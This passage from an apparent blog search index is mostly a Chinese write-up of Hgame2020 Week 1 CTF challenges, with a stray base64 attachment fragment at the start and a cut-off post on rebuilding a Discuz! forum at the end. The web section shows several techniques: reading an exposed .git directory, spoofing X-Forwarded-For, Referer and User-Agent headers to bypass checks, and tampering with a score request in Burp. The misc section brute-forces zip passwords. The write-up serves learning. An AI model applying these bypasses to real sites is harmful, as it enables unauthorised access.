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 AEoxAAAAAA== ------=_Part_1677_1542689141.1579889521561--你也可以 点击这里下载txt文件 （红包过期的话直接私戳我好了 注意不要把flag告诉别人啊！！！","path":"S3CrEt5/dsfhqlewkaljlkfdnos/sfjdio2q3rklfanfdl;kjflkejfl;gf3/A1s0F4ke23333/Miao.html"}],"posts":[{"title":"CTF | Hgame2020 Week1 WriteUp","text":"前言这几天玩了玩杭州电子科技大学的Hgame2020，还别说，有点意思2333。 平台网址： https://hgame.vidar.club/ Flag格式：hgame{.+} MISC签到题Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0tbase64解码得到 .-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...-- 一看就是摩斯电码，加入分隔符后解码得到flag W3LC0ME_TO_2020_HGAM3 在线解密摩斯密码 www.atool9.com/morse.php 壁纸解压得到图片Pixiv@純白可憐.jpg，foremost提取得到一个zip压缩文件。备注提示 Password is picture ID. 本来还以为是在图片的文件里，而且还找到了一个id属性，然而并不是。 上网查了一下純白可憐，发现是P站画家，看了一篇介绍原来每张图片有个编号来着。 试了试百度搜图，出来的画风有点不对劲emmm。干脆直接上P站搜，然后在页面上找到了这张图。 （还别说，挺好看的哇，还是个中国画师喵。 天意 https://www.pixiv.net/artworks/76953815 得到ID 76953815，作为密码解压flag.txt（这么短还全数字，其实可以暴力破解的），得到 \\u68\\u67\\u61\\u6d\\u65\\u7b\\u44\\u6f\\u5f\\u79\\u30\\u75\\u5f\\u4b\\u6e\\u4f\\u57\\u5f\\u75\\u4e\\u69\\u43\\u30\\u64\\u33\\u3f\\u7dUnicode啦，转ASCII（用的是NATIVE转ASCII来着）得到flag hgame{Do_y0u_KnOW_uNiC0d3?} 克苏鲁神话明文攻击得到了解密后的zip文件。 得到加密的 The Call of Cthulhu.doc文件。根据 Bacon.txt文件提示寻找密码。 of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd. *Password in capital letters.然而不成功，不知道怎么做下去了嘤嘤嘤。 >>> s='of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd' >>> s1=[i for i in s if i>='A' and i&lt;='Z'] >>> s1 ['S', 'C', 'G', 'E', 'A', 'O', 'R', 'N', 'G', 'S', 'H', 'B', 'E', 'C', 'E', 'A', 'A', 'S', 'R', 'I', 'F', 'H', 'G', 'R', 'E', 'O', 'T', 'E', 'O'] >>> ''.join(s1) 'SCGEAORNGSHBECEAASRIFHGREOTEO' 签到题ProPlusPassword.txt提示了 Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y h jnsxf qjFjf jnb rg fiyykwtbsnkm tm xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn. JRFVJYFZVRUAGMAI Three fences first, Five Caesar next. English sentense first, zip password next. 一开始还以为前面的是3个栅栏，后面的是5个凯撒，然后试了半天都不对。 突然一想应该是先栅栏再凯撒，一试果然。 先解密zip密码：栅栏得到JFARZGFVMVRAJUIY，凯撒得到密码 EAVMUBAQHQMVEPDT。解压得到 OK.txt。 同时上面的那句话同理解密得到 Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice. emmm不大理解，不管了。 看文件是Ook!编码，解密得到base32编码。 data:text;base再base32解密得到 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一看结尾==，应该是base64编码，于是继续解密。 噫是个PNG图片。加上头补全 data:image/png;base64,。草（一种植物），真会玩，是个二维码。 （也可以base64解密后保存为二进制文件然后打开。 扫码得到flag： hgame{3Nc0dInG_@lL_iN_0Ne!} 真的会玩2333（（好，我也要整一个各种编码的嘻嘻嘻 Reference:https://www.qqxiuzi.cn/bianma/kaisamima.phphttps://www.splitbrain.org/services/ook 每日推荐得到一个.pcapng抓包文件，用Wireshark打开，查看http，发现应该是与wordpress博客相关。 利用“文件-导出对象-HTTP”，分析其中的对象。 结合题目提示 ObjectNotFound正听着网易云每日推荐… 发现了一个上传的网页—— 这是一个提交的表格，发现了上传的文件 song.zip，将其提取出来。 压缩包里果然是一首歌，且备注里提示是6位数字。 考虑到6位数字，直接就暴力破解好了。（其实还在抓包文件里找了老半天没找到（（（ 利用口令759371解压得到mp3文件。 一开始打开010editor找，没有。 foremost提取得到了封面图，也没有隐写。 看来在音频里了，猜想就是音频隐写嘛。 既然是MP3，先试试MP3StegoDecode，结果么得。 the bit stream file I Love Mondays.mp3 is a BINARY file HDR: s=FFF, id=1, l=1, ep=on, br=4, sf=3, pd=0, pr=0, m=0, js=0, c=0, o=0, e=0 alg.=MPEG-1, layer=I, tot bitrate=128, sfrq=0.0 mode=stereo, sblim=32, jsbd=32, ch=2 [Frame 3]OpenTable: could not find tables/huffdec Check local directory &#39;./tables/&#39; Please check huffman table &#39;huffdec&#39;上网找了一下，下了个音频处理软件Audacity。（免费开源跨平台，还不错 Free, open source, cross-platform audio software. Audacity is an easy-to-use, multi-track audio editor and recorder for Windows, Mac OS X, GNU/Linux… 查看频谱，得到flag： hgame{I_love_EDM233} Electronic Dance Music （电子舞曲）可还行。 第一次做音频隐写的题，哇脑洞真大，太有意思了233333 WebCosmos 的博客http://cosmos.hgame.n3ko.co/ 先在网页里找了半天没找到emmm 后来发现，既然说版本管理工具，还有GitHub嘛。 那就构造/.git/config试试 果然—— [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote &quot;origin&quot;] url = https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc fetch = +refs/heads/*:refs/remotes/origin/*好，这个GitHub仓库有戏！ 访问一波，然后在commit里找到了flag。 base64解码得到flag hgame{g1t_le@k_1s_danger0us_!!!!} /.git目录公开访问是挺危险的emmm 接 头 霸 王http://kyaru.hgame.n3ko.co/ 直接访问，提示 You need to come from https://vidar.club/. 增加请求头: Referer: https://vidar.club/，重发后提示 You need to visit it locally. 增加请求头：X-Forwarded-For: 127.0.0.1 You need to use Cosmos Brower to visit. 改UA：User-Agent: Cosmos The flag will be updated after 2077, please wait for it patiently. 根据响应头 Last-Modified: Fri, 01 Jan 2077 00:00:00 GMT，进行修改。把 If-Unmodified-Since 设置在 Last-Modified 之后就可以了。 增加请求头：If-Unmodified-Since: Fri, 01 Jan 2077 00:00:00 GMT 得到flag hgame{W0w!Your_heads_@re_s0_many!} 这题一波三折啊。 最后这个操作让我想到了ustc的hackgame里信息安全 2077那道题，然后回去看了一下233. Reference： https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md 🐔尼泰玫cxk有点好玩2333 随便玩了一下觉得有点无聊（x 看了一下网页源代码，发现是用canvas画布画出来的，交互用的js，有点意思i。 然后打开了Burp Suite，抓个包看看吧。 发现游戏结束的时候会POST当前得分。 不够则提示 Your score must more than 30000 , then you can get the flag. Happy game! 那就截包改包好了啦，直接给他加个0. 这就出来了呀！ ​ hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!} Code Worldconsole.log(\"This new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!\") CryptoInfantRSA题目给了如下的代码—— #!/usr/bin/env python3 from secret import flag assert flag.startswith(b'hgame{') and flag.endswith(b'}') m = int.from_bytes(flag, byteorder='big') p = 681782737450022065655472455411 q = 675274897132088253519831953441 e = 13 c = pow(m, e, p*q) assert c == 275698465082361070145173688411496311542172902608559859019841 RSA啦。这里就根据密文C把明文M给找出来。 c = 275698465082361070145173688411496311542172902608559859019841 n = 460390767897997184102969941508880171690097589571068900519251 d = 141658697814768364339375366617699419709389378231351875726277 m = pow(c,d,n) # 得到m为39062110472669388914389428064087335236334831991333245 # 再将数字m转换为字符串 import binascii flag = binascii.unhexlify(hex(m)[2:]) 或者 用上面的工具里的Test： 得到flag： hgame{t3Xt6O0k_R5A!!!} Reference: 介绍RSA的https://www.freebuf.com/articles/others-articles/166049.htmlhttps://www.freebuf.com/articles/others-articles/161475.htmlhttps://www.k2zone.cn/?p=2157 Reordernc 47.98.192.231 25002 敲个回车就可以得到一个乱序的字符串，刚开始还以为是分组来着，然后试了半天不对emmm。 后来才发现，原来每次的结果都不一样233，比如下面是一些实验结果。 Rua!!! $hLjgp+ame{UI5mtA3}u_!iP!RmTn0eT Rua!!! $mtgIUeapjm{h+5LAeT_nTRP!u!m3i0} Rua!!! t5m{ag+eh$UjILmpT0!mP_iR3ATun}e! $mhmjI5te+{apUgLAe3!un0TRimP!T_} mat5jIpmg$heLU{+!PT0un!e_A3R}Tmi {LUpt5mI+e$mgajhm}T!T0!niRAe_Pu3 $Umm+g{LIe5jphtaAT!ei_m}nR0u!3TP 5I{eLmt+ha$mgpjU0nmR}eTi3PA!_!uT Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R既然是乱序吧，那就看看到底是什么个顺序好了！ 上面字符串的长度为32，于是构造字符串 str1=&#39;123456abcdefghijklmnopqrstuvwxyz&#39; 输入后得到 str2=&#39;jhca1346ibdefg25zxsqkmnpyrtuvwlo&#39; 试了发现该顺序不变，于是得到编码的对应关系（正变换逆变换嘛233333） str1='123456abcdefghijklmnopqrstuvwxyz' print(len(str1)) str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo' # 正变换 location=list(range(len(str1))) for i in range(len(str2)): location[i]=str1.index(str2[i]) print(location) # [15, 13, 8, 6, 0, 2, 3, 5, 14, 7, 9, 10, 11, 12, 1, 4, 31, 29, 24, 22, 16, 18, 19, 21, 30, 23, 25, 26, 27, 28, 17, 20] # 逆变换 ilocation=list(range(len(str1))) for i in range(len(str2)): ilocation[i]=str2.index(str1[i]) print(ilocation) # [4, 14, 5, 6, 15, 7, 3, 9, 2, 10, 11, 12, 13, 1, 8, 0, 20, 30, 21, 22, 31, 23, 19, 25, 18, 26, 27, 28, 29, 17, 24, 16] # 验证结果 str3='' for i in location: str3+=str1[i] print(str3) # jhca1346ibdefg25zxsqkmnpyrtuvwlo 这里用到的是正变换，暴力破解一波吧！ str_encrypted = r'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R' str_decrypted = '' for _ in range(80): for i in location: str_decrypted += str_encrypted[i] print(str_decrypted) str_encrypted = str_decrypted str_decrypted = '' 最开始试了50次没出来233，后来把数字改大了一点233. 终于跑出来了！ 得到flag： hgame{jU$t+5ImpL3_PeRmuTATi0n!!} 果然就排列呗23333 还试了一下，这个130次一循环来着emmm。就这样，发现range改到131就出现两个了。 str_encrypted = r'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R' str_decrypted = '' for _ in range(130): for i in location: str_decrypted += str_encrypted[i] if str_decrypted.startswith('hgame'): print(str_decrypted) str_encrypted = str_decrypted str_decrypted = '' 不对唉！好像没这么简单。重新试了一下之前的几个Rua!!!之后的结果，发现这个变换不可行emmm。 必须是连续输入上一次出来的结果才行。（可能理解有误 Affine题目给了这段用来加密的代码，现在就想办法还原回去找flag吧。 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import gmpy2 from secret import A, B, flag assert flag.startswith('hgame{') and flag.endswith('}') TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM' MOD = len(TABLE) cipher = '' for b in flag: i = TABLE.find(b) if i == -1: cipher += b else: ii = (A*i + B) % MOD cipher += TABLE[ii] print(cipher) # A8I5z{xr1A_J7ha_vG_TpH410} 提示了flag以 hgame{ 开头，以 } 结尾，很明显能看出来{ } _这三个字符是找不到而直接加到cipher里的。 容易得到 MOD=62，于是乎思路就是，利用 hgame 与 A8I5z 的映射关系，把A和B两个参数给求解出来，再把参数i反解出来，最后把flag还原。 码代码吧。 TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM' MOD = len(TABLE) # 62 flag = 'hgame' cipher = '' for b in flag: i = TABLE.find(b) print(b, i) # 求解得到对应的i # h 12 # g 11 # a 7 # m 6 # e 18 str_encrypt = r'A8I5z{xr1A_J7ha_vG_TpH410}' iis = list(range(5)) i = 0 for letter in str_encrypt[0:5]: iis[i] = TABLE.index(letter) print(letter, iis[i]) i += 1 # 求解得到对应的ii # A 46 # 8 33 # I 43 # 5 30 # z 0 得到了字母对应的i和ii，而i与ii满足关系 (A*i+B) % 62 = ii，从而可以把A、B解出来。 查了查模逆运算，看了看觉得有点麻烦emmm 猜想A、B不会太大，干脆直接遍历好了。。 for A in range(1, 62): for B in range(1, 62): if (12*A+B) % 62 == 46 and (11*A+B) % 62 == 33 and (7*A+B) % 62 == 43 and(6*A+B) % 62 == 30 and(18*A+B) % 62 == 0: print(\"Yes: \", A, B) # Yes: 13 14 得到A=13，B=14. 接下来还原flag。 # Begin to decrypt... A = 13 B = 14 str_encrypt = 'xr1AJ7havGTpH410' str_decrypt = '' for letter in str_encrypt: ii = TABLE.index(letter) for i in range(62): temp = (A*i + B) % 62 if temp == ii: print(i, TABLE[i]) str_decrypt += TABLE[i] print(str_decrypt) # M4thu5EdiNcRYpt0 # So the flag is `hgame{M4th_u5Ed_iN_cRYpt0}`. 这里先把_给去掉了，最后再加上。 于是乎flag就是： hgame{M4th_u5Ed_iN_cRYpt0} 看来果然是数学啊2333，还想看看大佬们怎么用数学方法解出来的。（（ 如题目所言—— Some basic modular arithmetic… Reference: 一点关于模逆运算的介绍，后面有空再看看吧（x https://blog.csdn.net/lion19930924/article/details/61926019 未完待续（可能会咕咕咕","path":"2020/01/23/CTF_Hgame2020/"},{"title":"小想法 | 重建那些年基于Discuz!系统搭建的满是回忆的班级网站","text":"2020年第一篇哈，先祝大家新年快乐，每天都有新收获喵！ 哇呜！今天终于下了今年的第一场雪，贼惊喜~（然而积不起来啊嘤嘤嘤 前言 最近期末考试月忙死了，刚考完一科，难得有空来浪一下。考完一科浪两天然后作死复习的是我了emmm嘤嘤嘤。 有一次和奶冰冰聊天，回忆起之前折腾过的、搭建过的各种网站，而后就想到了N年以前搭建的班级网站。 （很明显，那时候提供网络服务的各种空间、域名什么的到现在没几个还能用的了。 2017年10月的时候，我的邮箱突然收到了一封来自Red Hat的邮件，提醒我OpenShift Online v2 End of Life了。↓ 那时候感觉特别惊喜，毕竟到那时已经放在那上面四五年了，我都差点忘记它的存在了。虽然域名早就炸了，但是这个免费的云平台居然还在（这个角度看来 Red Hat 还是挺可靠的233）。 那时就登上去看了一下，哇呜数据居然都还在，通过默认的域名还访问到了网站，于是好怀念啊，为了留个纪念就截了个图。 N年前先建了10班的班网论坛，（分班后）又建了个8班的班网。 ​ 几天之后，果不其然，Unavailable了。 不过还好那时候就有备份的好习惯（不是），试了几个密码登录进了8班的班网，然后把数据库给备份下来了，不过也只备份了数据库，附件啊头像啊这些就没备份下来。10班的班网（更是由于记不得密码了）就没成功备份emmm。 于是现在就觉得有点遗憾，通过phpMyAdmin其实可以直接导出数据库的；在重建的时候知道通过修改数据库可以把创始人密码修改的。 但那时候不大清楚这些，也有可能是那时连服务器密码都不记得了（（（ 最近这几天就想，干脆试一下，看看能不能重建那时候的班网吧。 